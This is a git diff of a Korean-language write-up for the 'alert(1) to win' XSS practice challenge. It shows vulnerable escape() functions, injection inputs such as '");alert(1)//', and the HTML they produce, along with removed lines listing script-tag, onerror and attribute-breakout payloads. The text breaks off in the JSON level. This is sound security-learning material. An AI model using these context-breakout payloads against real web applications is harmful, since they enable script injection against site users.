@@ -1,8 +1,8 @@
 ---
-title: "alert(1) to win — XSS 챌린지"
+title: "alert(1) to win"
 date: "2023-08-27"
-description: "alert(1) to win XSS 챌린지 풀이 — 다양한 XSS 필터 우회 기법 실습"
-tags: ["web", "xss", "javascript", "portswigger"]
+description: "alert(1) to win XSS 챌린지 풀이"
+tags: ["web", "xss", "javascript"]
 platform: "portswigger"
 category: "web"
 difficulty: "Easy"
@@ -11,28 +11,64 @@ authors:
     link: "https://github.com/Phantomn"
 ---
 
-[alert(1) to win](https://alf.nu/alert1)은 다양한 JavaScript 컨텍스트에서 `alert(1)`을 실행하는 XSS 챌린지다.
-
 ## WarmUp
 
-기본적인 XSS 주입 문제. 입력값이 HTML에 그대로 반영되는 경우 `<script>alert(1)</script>` 또는 `<img src=x onerror=alert(1)>`으로 해결한다.
+The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.
 
-## Adobe (속성 컨텍스트 우회)
-
-입력값이 HTML 속성 내에 삽입되는 경우 속성 값 탈출이 필요하다:
-
-```html
-" onmouseover="alert(1)
+```jsx
+function escape(s) {
+  return '<script>console.log("'+s+'");</script>';
+}
 ```
 
-또는 다음 패턴:
+간단한 함수이다. script 태그로 console.log를 찍어주는 함수이다.
 
-```html
-"><script>alert(1)</script>
+### Payload
+
+첫번째로 console.log를 탈출한다.
+
+그리고 alert구문을 삽입하면 될것 같다.
+
+```jsx
+Input : ");alert(1)//
+Output : <script>console.log("");alert(1)//");</script>
 ```
 
-## 핵심 학습
+이게 주석을 써도 </script>는 유지되나 보다.
 
-- HTML 컨텍스트별 XSS 주입 방법이 다르다
-- 필터 우회는 인코딩, 대소문자 변환, 특수 이벤트 핸들러 활용
-- `alert(1)`이 막혀있을 때 `prompt(1)`, `confirm(1)`, `alert\`1\`` 등 대안 사용
+---
+
+## Adobe
+
+```jsx
+function escape(s) {
+  s = s.replace(/"/g, '\\"');
+  return '<script>console.log("' + s + '");</script>';
+}
+```
+
+`"` 쌍따옴표를 `\"` 로 바꿔주는 함수이다.
+
+이번에도 console.log를 탈출하고 alert(1)을 호출하면 되는 문제이다.
+
+### Payload
+
+```jsx
+Input : \");alert(1)//
+Output : <script>console.log("\\");alert(1)//");</script>
+```
+
+\"을 씀으로써 console.log를 탈출하고 alert(1) 이후에 주석을 통해 뒤의 구문을 날린다.
+
+---
+
+## JSON
+
+```jsx
+function escape(s) {
+  s = JSON.stringify(s);
+  return '<script>console.log(' + s + ');</script>';
+}
+```
+
+`JSON.stringify()` 함수의 역할이 JSON 을 자바스크립트 문자열 객체로 변경해주는 역할이라고한다. JSON값을 JavaScript 문자열 객체로 만든다는것이다. 그렇다면...<input>을 넣으면 input태그가 생성되는걸까?
